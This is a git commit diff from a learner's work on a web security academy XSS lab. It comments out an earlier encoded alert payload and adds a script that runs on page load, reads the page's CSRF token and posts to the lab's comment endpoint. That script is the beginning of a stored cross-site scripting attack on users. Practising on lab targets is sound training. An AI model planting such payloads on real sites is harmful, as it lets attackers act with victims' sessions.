6899e4e708c14a9970a6d3b6e92fe81f32798fdd
iitsmel <iitsmel@users.noreply.github.com>
2021-12-30 02:28:34 +0800

    working on XSS lab 11

--- WebSecurityAcademy/XSS/Labs.js
+++ WebSecurityAcademy/XSS/Labs.js
@@ -1,3 +1,13 @@
-const encoded = encodeURIComponent('window.alert(1)');
-const decoded = decodeURIComponent(encoded);
-console.log(encoded);
+// Lab 08
+//const encoded = encodeURIComponent('window.alert(1)');
+//const decoded = decodeURIComponent(encoded);
+//console.log(encoded);
+
+// Lab 11
+window.onload = function(e) {
+    var csrf = document.getElementsByName("csrf")[0].value;
+    console.log(csrf);
+    fetch('https://ac831f741fec961ec04fca9300e00070.web-security-academy.net/post/comment/', {
+        method: 'POST',
+    });
+};
